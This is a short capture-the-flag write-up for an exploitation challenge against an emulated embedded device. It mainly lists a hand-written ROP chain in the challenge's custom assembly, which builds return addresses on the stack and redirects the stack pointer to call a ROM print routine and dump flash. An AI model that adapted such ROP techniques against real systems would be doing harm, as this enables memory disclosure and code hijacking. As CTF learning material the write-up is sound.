# The Weird Machine (Challenge 10, Exploitation - 400pts)

>> Damn fridges. It seems there is no end to the problems they bring. And this time time it got even more difficult. I guess you already know in which direction this goes, right?

This is the continuation of the Hide & Seek challenge. The last simple code didn't work, it seems that the flag is not in the RAM anymore. What I did was to create a new code that dumps the flash to learn why it doesn't work anymore.

My way of this is by using ROP chain to call `puts_rom` (code at 0x494)


  xor flag,flag
  xor r1,r1
  mov.h r1, 0006
  mov.l r1, 0000
  xor flag, r1
  xor r1, r1
  mov.l r2, 4142 # ignored (will be popped)
  mov.h r2, 8a02 # 
  put r1, r2	#write r2 to r1
  mov.l r3, 4
  add r1, r3
  mov.l r2, OFFSET# offset  to read
  mov.h r2, 8702 # 
  put r1, r2
  add r1, r3
  mov.l r2, 0000
  mov.h r2, 0000
  put r1, r2
  add r1, r3
  mov.l r2, 5c02
  mov.h r2, ab02 #wait key
  put r1, r2

  #change stack ptr
  xor flag,flag
  xor r1, r1
  mov.l r1, 5b
  mov.h r2,05ff  # SPL SPH 
  mov.l r2,0000
  put r1, r2

The FLAG is not in the flash, so it needs to be called. The easiest way for me is to use simulavr.

 ![solution](./ctf.jpg?raw=true "solution")

